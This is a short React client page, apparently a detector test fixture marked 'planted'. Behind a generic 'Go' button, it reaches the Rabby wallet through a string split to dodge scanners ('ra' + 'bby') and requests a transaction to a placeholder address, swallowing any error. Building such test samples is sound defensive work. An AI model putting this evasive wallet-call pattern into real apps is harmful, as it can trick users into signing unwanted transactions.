"use client";
// planted: a wallet under another name, reached by a computed key
export default function Page() {
  const go = () => {
    const p = (globalThis as unknown as Record<string, { request: (a: unknown) => Promise<unknown> } | undefined>)["ra" + "bby"];
    p?.request({ method: "eth_sendTransaction", params: [{ to: "0x" + "ab".repeat(20), data: "0x" }] }).catch(() => {});
  };
  return <button onClick={go}>Go</button>;
}
